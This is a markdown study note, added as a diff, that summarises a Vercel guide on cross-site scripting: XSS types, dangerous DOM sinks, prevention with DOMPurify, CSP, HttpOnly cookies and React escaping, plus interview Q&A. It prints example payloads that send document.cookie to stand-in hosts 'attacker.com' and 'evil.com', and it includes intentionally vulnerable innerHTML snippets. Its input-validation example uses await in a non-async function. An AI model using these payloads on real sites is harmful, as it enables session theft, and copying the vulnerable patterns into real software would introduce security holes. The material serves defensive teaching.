@@ -1,0 +1,171 @@
+# XSS Attacks (Vercel Guide)
+
+**Cross-Site Scripting**: Malicious scripts injected into trusted sites. Bypasses same-origin policy → **steals cookies/sessions**, defaces sites, spreads malware. **3 types**: DOM-based, Reflected, Stored (most dangerous).[1]
+
+## Key Topics Section-wise
+
+### Attack Lifecycle (4 Stages)
+**How It Happens:**
+1. **Identify vulnerable site** - Trusts unsanitized user input
+2. **Craft payload** - `<img src=x onerror=alert('XSS')>`
+3. **Embed payload** - Comments, profiles, search params
+4. **Execute in victim browser** - Steals `document.cookie`
+
+**Example Payloads:**
+```html
+<!-- Comment injection -->
+<script>fetch('attacker.com?cookie='+document.cookie)</script>
+
+<!-- Broken image -->
+<img src=x onerror="fetch('evil.com?'+document.cookie)">
+```
+
+### 1. DOM-based XSS (Client-side)
+**Pure JavaScript DOM Manipulation:**
+```javascript
+// VULNERABLE
+const params = new URLSearchParams(window.location.search);
+document.getElementById('content').innerHTML = params.get('message');
+// ?message=<script>alert('Hacked!')</script> → Executes
+```
+**Detection Difficulty:** No server request → WAFs miss it
+
+### 2. Reflected XSS (Server Bounce)
+**Immediate Execution (No Storage):**
+```javascript
+// VULNERABLE search page
+const query = new URLSearchParams(location.search).get('query');
+document.getElementById('result').innerHTML = query;
+// ?query=<script>stealCookies()</script> → Social engineering link
+```
+**Requires:** Tricking victim to click crafted URL
+
+### 3. Stored XSS (Persistent - WORST)
+**Database Poisoning:**
+```javascript
+// VULNERABLE comment system
+function postComment() {
+  const comment = document.getElementById('comment').value;
+  saveCommentToDB(comment);  // No sanitization
+  document.getElementById('comments').innerHTML += comment;
+}
+```
+**Impact:** **Every visitor** executes attacker's script
+
+### Impact & Consequences
+| Effect | Example |
+|--------|---------|
+| **Session Hijacking** | `document.cookie` → attacker server |
+| **Keylogging/Phishing** | Fake login forms |
+| **Malware** | Force downloads |
+| **Defacement** | Rewrite page content |
+
+## Key Classes/Interfaces (Attack Vectors)
+| DOM Sink | Risk |
+|----------|------|
+| `innerHTML` | **High** - Parses HTML/JS |
+| `outerHTML` | **High** |
+| `document.write` | **High** |
+| `eval()` | **Critical** |
+| `setTimeout(string)` | **High** |
+
+## Design Patterns (Prevention)
+
+**1. Input Validation (Server):**
+```javascript
+export function POST(req) {
+  const { age } = await req.json();
+  if (!Number.isInteger(Number(age))) {
+    return Response.json({error: 'Invalid age'}, {status: 400});
+  }
+  // Process safe input
+}
+```
+
+**2. Sanitization (DOMPurify):**
+```javascript
+import DOMPurify from 'isomorphic-dompurify';
+const safeComment = DOMPurify.sanitize(userComment);
+```
+
+## Best Practices & Defenses
+
+| Defense | Implementation | Coverage |
+|---------|----------------|----------|
+| **Reject bad input** | `Number.isInteger(age)` | Server validation |
+| **Sanitize HTML** | `DOMPurify.sanitize()` | User content |
+| **No inline handlers** | `addEventListener()` vs `onclick=` | Event binding |
+| **CSP Headers** | `Content-Security-Policy: default-src 'self'` | Script sources |
+| **`HttpOnly` cookies** | `Set-Cookie: session=abc; HttpOnly; Secure` | JS cookie access |
+| **React JSX** | `{userComment}` auto-escapes | **Default safe** |
+
+**React-Specific:**
+```jsx
+// ❌ DANGEROUS
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+// ✅ SAFE (auto-escaped)
+<div>{userInput}</div>
+```
+
+## Advanced Topics
+
+**CSP (Content Security Policy):**
+```html
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+<!-- Blocks: inline scripts, external scripts, eval() -->
+```
+
+**Next.js Middleware CSP:**
+```javascript
+// middleware.js
+export function middleware(req) {
+  const csp = "default-src 'self'";
+  const res = NextResponse.next();
+  res.headers.set('Content-Security-Policy', csp);
+  return res;
+}
+```
+
+## Interview Cheat Sheet (Q&A)
+
+**Q: Stored vs Reflected XSS?**  
+A: **Stored**: Persistent (DB), affects **all visitors**; **Reflected**: One-time (URL), needs **social engineering**[1]
+
+**Q: Why `innerHTML` dangerous but `{text}` safe in React?**  
+A: **innerHTML**: Parses HTML/JS; **React**: **Auto-escapes** to entities
+
+**Q: `HttpOnly` cookie purpose?**  
+A: **Blocks `document.cookie`** access → prevents XSS cookie theft
+
+**Q: DOM-based XSS detection challenge?**  
+A: **Client-only** - no server request → WAFs/Web Application Firewalls miss it
+
+**Q: CSP `default-src 'self'` blocks what?**  
+A: **Inline scripts**, external scripts, `eval()`, `document.write()`
+
+**Q: Safest React user content rendering?**  
+A: **`{userInput}`** → auto-escaped; avoid `dangerouslySetInnerHTML`
+
+## Important Terms & Keywords
+
+**Attack Types:**
+- **DOM-based XSS** - Client-side URL param → `innerHTML`
+- **Reflected XSS** - Server reflects unsanitized param
+- **Stored XSS** - DB-stored malicious script (persistent)
+
+**DOM Sinks (Dangerous):**
+- `innerHTML`, `outerHTML`, `document.write`
+- `eval()`, `setTimeout(string)`, `setInterval(string)`
+
+**Defenses:**
+- **DOMPurify** - HTML sanitization library
+- **CSP** - Content Security Policy headers
+- **`HttpOnly`** - JS-inaccessible cookies
+- **Server Validation** - Reject malformed input
+
+**React:**
+- **`dangerouslySetInnerHTML`** - Manual HTML (sanitize first!)
+- **JSX `{}`** - **Auto-escaping** (safe default)[1]
+
+[1](https://vercel.com/kb/guide/understanding-xss-attacks)
